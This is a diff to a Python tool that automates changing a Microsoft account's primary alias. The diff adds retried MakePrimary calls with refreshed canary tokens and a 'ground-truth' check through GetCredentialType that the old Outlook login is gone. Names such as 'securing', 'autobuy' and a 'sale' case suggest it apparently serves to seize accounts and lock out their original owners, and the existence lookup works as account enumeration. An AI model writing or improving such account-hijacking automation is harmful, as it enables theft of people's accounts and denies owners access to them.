@@ -11,6 +11,7 @@ HTTP flow aligned with dona-fork (names/manage canary → AddAssocId → MakePri
 from __future__ import annotations
 
 from urllib.parse import unquote
+import asyncio
 import json
 import logging
 import re
@@ -335,6 +336,88 @@ async def _add_outlook_alias(
     return False
 
 
+async def _gct_exists(email: str) -> bool | None:
+    """True/False if GetCredentialType is conclusive; None if unknown.
+
+    IfExistsResult: 0 = exists, 1 = does not exist (MS convention).
+    """
+    email = (email or "").strip()
+    if not email or "@" not in email:
+        return None
+    try:
+        from securing.autobuy_hold_check import fetch_credential_type
+
+        info = await fetch_credential_type(email)
+    except Exception as exc:
+        logger.warning("GCT exists-check failed for %s: %s", email, exc)
+        return None
+    if not info:
+        return None
+    flag = info.get("IfExistsResult")
+    if flag in (1, "1"):
+        return False
+    if flag in (0, "0"):
+        return True
+    return None
+
+
+async def _confirm_primary_switched(
+    session: httpx.AsyncClient,
+    new_full: str,
+    old_email: str | None,
+) -> bool:
+    """Ground-truth check after MakePrimary — API often lies / returns opaque errors
+    while ``removeOldPrimary`` already deleted the old Outlook login.
+    """
+    new_l = (new_full or "").strip().lower()
+    old_l = (old_email or "").strip().lower()
+    if not new_l:
+        return False
+
+    # 1) names/manage scrape (may be stale right after promote — still useful)
+    try:
+        await asyncio.sleep(1.0)
+        _, _, aliases = await _get_manage(session)
+        aliases_l = {a.strip().lower() for a in aliases}
+        if new_l in aliases_l and old_l and old_l not in aliases_l:
+            print(
+                f"[+] - Primary switch confirmed on manage "
+                f"(has {new_full}, old {old_email} gone)"
+            )
+            return True
+    except Exception as exc:
+        logger.warning("manage confirm after MakePrimary failed: %s", exc)
+
+    # 2) GetCredentialType — authoritative for "account doesn't exist"
+    if old_l and old_l != new_l:
+        old_exists = await _gct_exists(old_l)
+        new_exists = await _gct_exists(new_l)
+        print(
+            f"[~] - Primary switch GCT check "
+            f"(old {old_l} exists={old_exists}, new {new_l} exists={new_exists})"
+        )
+        if old_exists is False and new_exists is True:
+            print(
+                f"[+] - Primary switch confirmed via GetCredentialType "
+                f"(old login removed, {new_full} live)"
+            )
+            return True
+        # Old gone + new unknown still strongly implies success
+        if old_exists is False and new_exists is not False:
+            print(
+                f"[+] - Primary switch confirmed via GetCredentialType "
+                f"(old login {old_email} no longer exists)"
+            )
+            return True
+    else:
+        new_exists = await _gct_exists(new_l)
+        if new_exists is True:
+            print(f"[+] - New primary exists on GCT ({new_full})")
+            return True
+
+    return False
+
+
 async def _make_primary(
     session: httpx.AsyncClient,
     full: str,
@@ -651,33 +734,68 @@ async def change_primary_alias(
                 else:
                     return False
 
-        # Refresh apicanary if possible — old one may be stale after elevation
-        try:
-            from securing.utils.cookies.get_cookies import get_cookies
+        # MakePrimary often flakes right after AddAssocId MFA (stale canary /
+        # session). Retry promote with a fresh canary before giving up — the
+        # alias is already on the account; inventing a NEW sunny on the outer
+        # loop just hits "try again later".
+        ok = False
+        for promo_try in range(1, 4):
+            try:
+                from securing.utils.cookies.get_cookies import get_cookies
 
-            fresh = await get_cookies(session)
-            if fresh:
-                apicanary = fresh
-        except Exception:
-            pass
+                fresh = await get_cookies(session)
+                if fresh:
+                    apicanary = fresh
+            except Exception:
+                pass
+            # Also pull canary from names/manage (more reliable post-MFA)
+            try:
+                _, manage_canary, on_manage = await _get_manage(session)
+                if manage_canary:
+                    apicanary = manage_canary
+                if full.lower() not in [e.lower() for e in on_manage]:
+                    # Alias vanished — don't keep promoting a ghost
+                    if promo_try == 1:
+                        print(f"[X] - Alias missing before MakePrimary ({full})")
+                    break
+            except Exception:
+                on_manage = []
 
-        ok = await _make_primary(session, full, apicanary)
-        if not ok:
-            return False
+            print(f"[~] - MakePrimary attempt {promo_try}/3 ({full})")
+            ok = await _make_primary(session, full, apicanary)
+            if ok:
+                break
+            # Even on API "failure", MS may have already applied removeOldPrimary.
+            if await _confirm_primary_switched(session, full, account_email):
+                return True
+            await asyncio.sleep(1.5 * promo_try)
 
-        # Final confirm on manage list
-        _, _, after = await _get_manage(session)
-        if full.lower() in after:
+        # Final ground-truth — never trust MakePrimary JSON alone (sale2026025 case:
+        # API reported fail, old Outlook deleted, sunny* became the only login).
+        if await _confirm_primary_switched(session, full, account_email):
             return True
-        # MakePrimary said OK but list scrape missed it — still trust promote
-        logger.warning(
-            "MakePrimary OK but %s not scraped on manage (aliases=%s)",
-            full,
-            after[:8],
-        )
-        return True
+
+        if ok:
+            _, _, after = await _get_manage(session)
+            if full.lower() in {a.lower() for a in after}:
+                return True
+            logger.warning(
+                "MakePrimary OK but %s not scraped on manage (aliases=%s) — trusting API",
+                full,
+                after[:8],
+            )
+            return True
+
+        print(f"[X] - Failed to change primary alias ({full})")
+        return False
 
     except Exception as e:
         logger.exception("Error changing primary alias: %s", e)
+        # Last-chance: MakePrimary may have thrown after MS already switched
+        try:
+            if await _confirm_primary_switched(session, full, account_email):
+                return True
+        except Exception:
+            pass
         print(f"[X] - Failed to change primary alias ({full})")
         return False
